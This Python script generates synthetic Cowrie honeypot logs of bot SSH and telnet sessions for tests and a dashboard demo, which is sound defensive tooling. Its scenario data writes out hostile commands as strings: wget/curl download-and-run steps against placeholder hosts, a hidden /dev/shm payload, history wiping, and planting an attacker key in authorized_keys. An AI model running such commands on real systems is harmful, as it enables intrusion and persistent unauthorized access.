"""Generate synthetic Cowrie JSON logs for tests and the dashboard demo.

Everything here is made up and labelled as such: source addresses are random
global unicast IPs (not observed attackers), payload hashes are SHA-256 of
placeholder strings, and download URLs point at RFC 5737 documentation
addresses and .invalid domains, so nothing resolves to real infrastructure.

Usage: python tools/generate_sample_logs.py --out samples/synthetic/cowrie.json.gz
"""

from __future__ import annotations

import argparse
import gzip
import hashlib
import ipaddress
import json
import math
import random
from datetime import UTC, datetime, timedelta
from pathlib import Path

SENSOR = "hp-sample"
DST_IP = "172.30.0.2"

CLIENTS = [
    ("SSH-2.0-Go", 30),
    ("SSH-2.0-libssh_0.9.6", 18),
    ("SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10", 12),
    ("SSH-2.0-paramiko_3.4.0", 8),
    ("SSH-2.0-PuTTY_Release_0.80", 4),
    ("SSH-2.0-libssh2_1.11.0", 10),
    ("SSH-2.0-OpenSSH_7.4", 6),
]

USERS = [("root", 50), ("admin", 14), ("ubuntu", 6), ("user", 5), ("test", 5), ("oracle", 3),
         ("pi", 3), ("postgres", 3), ("git", 2), ("support", 2), ("ftpuser", 2), ("guest", 2),
         ("ubnt", 2), ("deploy", 1), ("hadoop", 1)]
PASSWORDS = [("123456", 20), ("password", 10), ("admin", 9), ("root", 8), ("12345678", 6),
             ("123", 5), ("1234", 5), ("qwerty", 4), ("test", 4), ("P@ssw0rd", 3),
             ("admin123", 3), ("ubnt", 2), ("raspberry", 2), ("toor", 2), ("", 2),
             ("1qaz2wsx", 2), ("changeme", 2), ("letmein", 1), ("passw0rd", 1)]

# Each scenario is a list of commands an automated bot might send after login.
SCENARIOS = [
    (["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "nproc", "free -m | grep Mem",
      "w", "crontab -l"], 40),
    (["cd /tmp || cd /var/run || cd /mnt", "wget hxxp-placeholder/bins.sh",
      "chmod +x bins.sh", "sh bins.sh", "rm -rf bins.sh"], 22),
    (["cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0sample"
      "keymaterialnotreal mdrfckr\" >> .ssh/authorized_keys && chmod -R go= ~/.ssh"], 18),
    (["echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"", "uname -s -v -n -r -m",
      "cat /etc/os-release", "ls -la /dev/shm"], 12),
    (["curl -s hxxp-placeholder/x86_64 -o /dev/shm/.k", "chmod 777 /dev/shm/.k",
      "/dev/shm/.k", "history -c"], 8),
    (["enable", "system", "shell", "sh", "cat /proc/mounts; /bin/busybox ECCHI"], 10),
]

DROP_HOSTS = ["203.0.113.47", "198.51.100.12", "files.update-mirror.invalid",
              "cdn.botnet-sample.invalid", "192.0.2.88"]


def _weighted(rng: random.Random, items):
    values, weights = zip(*items)
    return rng.choices(values, weights=weights, k=1)[0]


def _random_global_ip(rng: random.Random) -> str:
    while True:
        ip = ipaddress.IPv4Address(rng.getrandbits(32))
        if ip.is_global and not ip.is_multicast and not ip.is_reserved:
            return str(ip)


def _ts(t: datetime) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def _fake_sha(label: str) -> str:
    return hashlib.sha256(f"synthetic-placeholder-payload:{label}".encode()).hexdigest()


def generate(seed: int, sessions: int, end: datetime, days: int) -> list[dict]:
    rng = random.Random(seed)
    start = end - timedelta(days=days)
    span = (end - start).total_seconds()

    # A pool of "botnets": repeat offenders produce realistic concentration by source.
    pool = [_random_global_ip(rng) for _ in range(220)]
    weights = [1 / (i + 1) ** 0.8 for i in range(len(pool))]

    events: list[dict] = []
    for _ in range(sessions):
        # Diurnal bump plus a mid-window surge so the hourly chart has shape.
        while True:
            offset = rng.random() * span
            t = start + timedelta(seconds=offset)
            day_frac = offset / span
            w = 0.6 + 0.4 * math.sin((t.hour / 24) * 2 * math.pi) + (
                1.5 if 0.55 < day_frac < 0.60 else 0
            )
            if rng.random() * 2.5 < w:
                break
        ip = rng.choices(pool, weights=weights, k=1)[0]
        sid = f"{rng.getrandbits(48):012x}"
        proto = "telnet" if rng.random() < 0.15 else "ssh"
        base = {"session": sid, "src_ip": ip, "sensor": SENSOR}

        def emit(eid: str, at: datetime, **fields) -> None:
            events.append({"eventid": eid, **fields, **base, "timestamp": _ts(at)})

        emit("cowrie.session.connect", t, src_port=rng.randint(1025, 65535), dst_ip=DST_IP,
             dst_port=2223 if proto == "telnet" else 2222, protocol=proto,
             message=f"New connection: {ip}:0 ({DST_IP}:2222) [session: {sid}]")
        t += timedelta(milliseconds=rng.randint(50, 400))
        if proto == "ssh":
            emit("cowrie.client.version", t, version=_weighted(rng, CLIENTS))

        success = False
        for _ in range(rng.randint(1, 6)):
            t += timedelta(milliseconds=rng.randint(200, 3000))
            user, pw = _weighted(rng, USERS), _weighted(rng, PASSWORDS)
            success = user == "root" and pw not in ("root", "123456") and rng.random() < 0.35
            emit("cowrie.login.success" if success else "cowrie.login.failed", t,
                 username=user, password=pw,
                 message=f"login attempt [{user}/{pw}] {'succeeded' if success else 'failed'}")
            if success:
                break

        if success:
            for cmd in _weighted(rng, SCENARIOS):
                t += timedelta(milliseconds=rng.randint(100, 2500))
                host = rng.choice(DROP_HOSTS)
                cmd = cmd.replace("hxxp-placeholder", f"http://{host}")
                emit("cowrie.command.input", t, input=cmd, message=f"CMD: {cmd}")
                if cmd.startswith(("wget ", "curl ")):
                    url = cmd.split()[1] if cmd.startswith("wget") else cmd.split()[2]
                    emit("cowrie.session.file_download.failed", t, url=url,
                         message="Attempt to download file(s) from URL failed")
            if rng.random() < 0.06:
                label = rng.choice(["mirai-like-a", "xmrig-like-b", "shellbot-like-c"])
                sha = _fake_sha(label)
                emit("cowrie.session.file_upload", t, filename=f"{label}.bin",
                     outfile=f"var/lib/cowrie/downloads/{sha}", shasum=sha,
                     message=f"SFTP Uploaded file \"{label}.bin\"")

        t += timedelta(seconds=rng.randint(1, 40))
        emit("cowrie.session.closed", t, duration=round(rng.uniform(0.5, 60), 1),
             message="Connection lost")

    events.sort(key=lambda e: e["timestamp"])
    return events


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--out", type=Path, required=True)
    ap.add_argument("--seed", type=int, default=1337)
    ap.add_argument("--sessions", type=int, default=3000)
    ap.add_argument("--days", type=int, default=14)
    ap.add_argument("--end", default="2026-10-25T23:30:00Z")
    args = ap.parse_args()
    end = datetime.fromisoformat(args.end.replace("Z", "+00:00")).astimezone(UTC)
    events = generate(args.seed, args.sessions, end, args.days)
    args.out.parent.mkdir(parents=True, exist_ok=True)
    opener = gzip.open if args.out.suffix == ".gz" else open
    with opener(args.out, "wt", encoding="utf-8", newline="\n") as fh:
        for e in events:
            fh.write(json.dumps(e, ensure_ascii=False) + "\n")
    print(f"wrote {len(events)} events ({args.sessions} sessions) to {args.out}")


if __name__ == "__main__":
    main()
